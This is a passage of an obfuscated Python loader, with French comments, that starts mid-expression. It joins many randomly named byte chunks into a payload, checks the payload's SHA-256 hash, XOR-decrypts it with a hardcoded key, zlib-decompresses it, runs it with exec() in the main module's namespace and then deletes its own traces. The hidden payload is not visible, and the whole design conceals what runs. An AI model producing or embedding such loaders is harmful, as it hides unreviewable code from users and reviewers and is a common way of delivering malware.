+ _coboH6Ak3IbWFg + _cwbv0p0ZdB1I3z + _cnTwQ2b43tNZGD + _cq_E4hd84kHcin + _clxNqeXK3OkFqp + _cxjWsIdTD5rxsf + _crTExTFEZ_r6GW + _c_dDucSoWTT6Px + _cyFg8eBRQEDIrd + _cfZuIDCZ2u0n8T + _cvyq4xt1RNxbNi + _ctTUK1XYsLG0ge + _cctNib7KGfe1F9 + _cyPz7RH9g_A9oe + _cj6BanoHjNuN0g + _cgWqEUp4g6EUAt + _cuG9cJ5uipkxqr + _caDSZUGK0767Wi + _caig0w1l1GaJK7 + _cf7wTSS586BIEb + _c_jfi1yvI3R1wm + _c_3jE7bQbfj9GH + _czMZPQkj_OcIUR + _cmeEEmOwruZ7Xz + _cuyhF3Ney5MId8 + _camVyMrD7a2HVX + _caXQAfAGD5owNJ + _cwFdxJuJfVOzA4 + _csyTtAVyZ5SWcW + _cqTnS_7FYFR9VG + _coSgHFoMIQgCDn + _ci16C4xJD_1Tmg + _cj_OINM_IMIu2A + _crHTNn4HGDcEFw + _cnAM94hZfWlLOQ + _cbyZXfZ3YJRJKt + _ccLkJhsqz4PA60 + _cfwsw7c5qaVuUg + _cpjbwjwQx2T_CN + _cwu1HaUvgWu1Yf + _caJSc15g38dxXO + _crORebu04HVPad + _cyIGQ_2ah_irhF + _ciEd_y0seh98PA + _cho4mF2HbSqQE6 + _crpOTr2CzGEbfb + _ceAQqdddKrVfsh + _cxbzaJHeEh7G2F + _cdFWdmsigvgkRs + _cdqlbTlrLfpA2e + _ciTNRW1KRzA1GA + _cmhDaSSb1PxfZI + _cmIyhoqikpeE4E + _czzfh0wEQCxdM3 + _cvBuFfT3zMxMMl + _ceu7cCc_wk1qxm + _ck7WXtPpH8KLup + _cwryxxzAd7jQM_ + _crKsz_FwDVImWK + _cg6TDyOMeFZmJD + _csQLXHo4bsWuaN + _czEwa5RTww9zEy + _cih5iSkKKAYXTV + _cwcmhOTXoFq1M8 + _c_L8aHARlp_231 + _c_d6B2cO1I1ZWb + _cm36qj_Pcm3rBu + _cg7aIUoEP1Yt45 + _cgwOH_8r5YJBlf + _cqgw_b2XW8sRVl + _cxpbbU0wEkRWhz + _cayfjRvDcUWetp + _cx93IvbItAcjqy + _c_7oZKqI8g8Fj4 + _chMMEeLO6p5Kdo + _cjZgrhylIx96Ej + _cf7P8k2MtAVsGO + _cv576_RXTxdaPF + _clqT5zE9Pt1BXQ + _ct7DwTypN33Wq1 + _ct1GbIfhBUplgx)
if __import__('hashlib').sha256(_ptGWLcCqYzkxpp).hexdigest() != 'e6a253c6fd9f89089bf3801d272d684170698b53f034799dc320b453f08fe492':
    __import__('sys').exit(1)
_xwghl9Yx1oWhzw = bytes([238, 233, 215, 79, 108, 51, 184, 46, 138, 250, 202, 180, 64, 231, 128, 229, 135, 25, 25, 166, 203, 190, 99, 33, 184, 184])
_fkvGcqREImq4hLO = bytes([119, 78, 108, 208, 137, 26, 36, 224, 111, 181, 86, 17, 83, 131, 106, 63, 187, 114, 15, 115, 192, 251, 238, 219, 92, 252])

def _fxiBGLZ1EBgjDqF(_bbxDFHgjEnqLTv, _ktzTbsSMgkgzB1):
    return bytes(_bbxDFHgjEnqLTv[_iiAZteyS9EFA2e] ^ _ktzTbsSMgkgzB1[_iiAZteyS9EFA2e % len(_ktzTbsSMgkgzB1)] for _iiAZteyS9EFA2e in range(len(_bbxDFHgjEnqLTv)))

def _fdvAAtxxeyZ4Eb0(_tlx7ONhf5Vjjir):
    import zlib
    return zlib.decompress(_tlx7ONhf5Vjjir) # Un seul niveau de zlib ici pour simplifier

def _ferlRFfVlFIWafx():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xgzj_hZ1Vw9e9E = _fxiBGLZ1EBgjDqF(_ptGWLcCqYzkxpp, _xwghl9Yx1oWhzw)
    # 2. Décompression Zlib
    _diiSbr_C7wT3oE = _fdvAAtxxeyZ4Eb0(_xgzj_hZ1Vw9e9E)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _diiSbr_C7wT3oE.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _njZNLclbnvRC7u = _main.__dict__
    _njZNLclbnvRC7u.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _njZNLclbnvRC7u)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_ferlRFfVlFIWafx()
try:
    del _fxiBGLZ1EBgjDqF, _fdvAAtxxeyZ4Eb0, _ferlRFfVlFIWafx
    del _ptGWLcCqYzkxpp, _xwghl9Yx1oWhzw, _fkvGcqREImq4hLO
except:
    pass
